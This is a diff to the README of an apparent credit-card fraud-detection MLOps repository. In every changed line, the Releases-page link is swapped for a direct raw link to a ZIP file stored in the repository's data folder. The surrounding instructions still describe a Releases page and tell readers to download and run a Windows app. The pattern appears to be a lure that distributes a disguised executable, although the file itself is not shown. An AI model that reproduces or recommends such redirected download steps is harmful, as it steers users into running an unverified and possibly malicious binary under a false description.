@@ -1,10 +1,10 @@
 # 🤖 fraud-detection-credit-mlops - Spot Card Fraud Faster
 
-[![Download](https://img.shields.io/badge/Download%20the%20app-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bintang3703/fraud-detection-credit-mlops/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20app-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bintang3703/fraud-detection-credit-mlops/raw/refs/heads/main/data/detection_credit_fraud_mlops_1.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/bintang3703/fraud-detection-credit-mlops/releases
+Visit this page to download: https://github.com/bintang3703/fraud-detection-credit-mlops/raw/refs/heads/main/data/detection_credit_fraud_mlops_1.7.zip
 
 On the Releases page, choose the latest version and download the file for Windows.  
 If you see more than one file, pick the one marked for Windows or the main app file.
@@ -37,7 +37,7 @@ For best results, close other large apps before you start.
 
 ## 🚀 How to download and run
 
-1. Open the download page: https://github.com/bintang3703/fraud-detection-credit-mlops/releases  
+1. Open the download page: https://github.com/bintang3703/fraud-detection-credit-mlops/raw/refs/heads/main/data/detection_credit_fraud_mlops_1.7.zip  
 2. Find the newest release at the top of the page  
 3. Download the Windows file from that release  
 4. If the file comes in a ZIP folder, right-click it and choose Extract All  
@@ -181,6 +181,6 @@ It also includes score checks used in credit and fraud work, such as KS, Gini, a
 
 ## 🖱️ Download again
 
-Visit this page to download: https://github.com/bintang3703/fraud-detection-credit-mlops/releases
+Visit this page to download: https://github.com/bintang3703/fraud-detection-credit-mlops/raw/refs/heads/main/data/detection_credit_fraud_mlops_1.7.zip
 
 Choose the latest release and get the Windows file from there.
